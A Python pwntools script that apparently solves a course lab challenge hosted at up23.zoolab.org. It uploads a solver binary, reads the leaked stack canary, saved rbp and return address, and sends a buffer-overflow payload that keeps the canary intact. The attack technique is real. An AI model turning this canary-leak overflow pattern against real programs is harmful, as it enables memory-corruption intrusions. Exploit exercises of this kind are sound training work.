#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    r.recvuntil(b'canary: ')
    canary = r.recvline()[:-1].decode()
    r.recvuntil(b'rbp: ')
    rbp = r.recvline()[:-1].decode()
    r.recvuntil(b'return_address: ')
    return_address = r.recvline()[:-1].decode()
    
    canary = int(canary, 16)
    rbp = int(rbp, 16)
    return_address = int(return_address, 16)

    num = 0
    ans = str(num).encode('ascii').ljust(24, b'\0')
    ans += p64(canary)
    ans += p64(rbp)
    ans += p64(return_address)
    ans += str(num).encode('ascii').ljust(24, b'\0')
    #print("ans={}".format(ans))
    r.sendafter(b'Show me your answer?', ans)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
